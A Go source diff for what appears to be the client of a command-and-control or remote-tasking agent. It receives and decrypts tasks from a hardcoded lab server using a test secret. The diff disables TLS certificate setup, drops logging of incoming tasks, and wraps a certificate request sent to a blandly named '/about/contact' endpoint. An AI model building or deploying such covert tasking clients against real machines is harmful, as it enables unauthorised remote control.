@@ -1,16 +1,10 @@
 package client
 
 import (
-	"bytes"
 	"crypto/rsa"
-	"crypto/tls"
-	"crypto/x509"
-	"encoding/base64"
 	"encoding/json"
 	"errors"
-	"fmt"
 	"log"
-	"net/http"
 	"os"
 	"os/signal"
 	"runtime"
@@ -69,6 +63,7 @@ var ClientDone chan interface{}
 var ClientInterrupt chan os.Signal
 var Client *data.Client
 var ServerHostName string
+var ServerPort string
 var ServerSecret string
 
 var clientCert string
@@ -79,6 +74,7 @@ var caCert string
 
 func init() {
 	ServerHostName = "192.168.56.1"
+	ServerPort = "443"
 	ServerSecret = "TestTestTestTest"
 	CheckedIn = false
 	CheckedInChan = make(chan interface{})
@@ -89,22 +85,24 @@ func init() {
 
 func InitializeClient() error {
 	Client = data.NewClient()
-	Client.ClientCaCertPool = x509.NewCertPool()
-	Client.WSConn = nil
+	//Client.ClientCaCertPool = x509.NewCertPool()
+	//Client.WSConn = nil
 	//err := ClientAcquireCertificateFromDisk()
-	err := ClientAcquireCertificate()
-	if err != nil {
-		return err
-	}
-	clientCertificate, err := tls.X509KeyPair([]byte(Client.ClientCertPEM), []byte(Client.ClientKeyPem))
-	if err != nil {
-		return err
-	}
-	ok := Client.ClientCaCertPool.AppendCertsFromPEM([]byte(Client.ClientRootCA))
-	if !ok {
-		return errors.New("could not load ca certificate.")
-	}
-	Client.ClientTLSCertificate = clientCertificate
+	//err := ClientAcquireCertificate()
+	/*
+		if err != nil {
+			return err
+		}
+		clientCertificate, err := tls.X509KeyPair([]byte(Client.ClientCertPEM), []byte(Client.ClientKeyPem))
+		if err != nil {
+			return err
+		}
+		ok := Client.ClientCaCertPool.AppendCertsFromPEM([]byte(Client.ClientRootCA))
+		if !ok {
+			return errors.New("could not load ca certificate.")
+		}
+		Client.ClientTLSCertificate = clientCertificate
+	*/
 	return nil
 }
 
@@ -124,13 +122,11 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	m := &data.Message{}
 	t := &data.Task{}
 	err := json.Unmarshal(message, m)
-	log.Printf("%+v", m)
 	// decrypt incoming task
 	decryptedTask, err := DecryptMessageWithSymKey(m.MessageData, []byte(ServerSecret))
 	if err != nil {
 		return err, nil
 	}
-	log.Println(string(decryptedTask))
 	err = json.Unmarshal(decryptedTask, t)
 	//err = json.Unmarshal(m.MessageData, t)
 	if err != nil {
@@ -451,6 +447,7 @@ func ClientAcquireCertificateFromDisk() error {
 	return nil
 }
 
+/*
 func ClientAcquireCertificate() error {
 	client := http.Client{
 		Timeout: time.Minute * 3,
@@ -467,7 +464,7 @@ func ClientAcquireCertificate() error {
 	if err != nil {
 		log.Fatal(err)
 	}
-	endpoint := fmt.Sprintf("https://%s:80/about/contact", ServerHostName)
+	endpoint := fmt.Sprintf("https://%s:/about/contact", ServerHostName)
 	r, err := client.Post(endpoint, "application/json", bytes.NewBuffer(certBytes))
 	if err != nil {
 		return err
@@ -488,3 +485,4 @@ func ClientAcquireCertificate() error {
 	Client.ClientRootCA = string(decodedCa)
 	return nil
 }
+*/
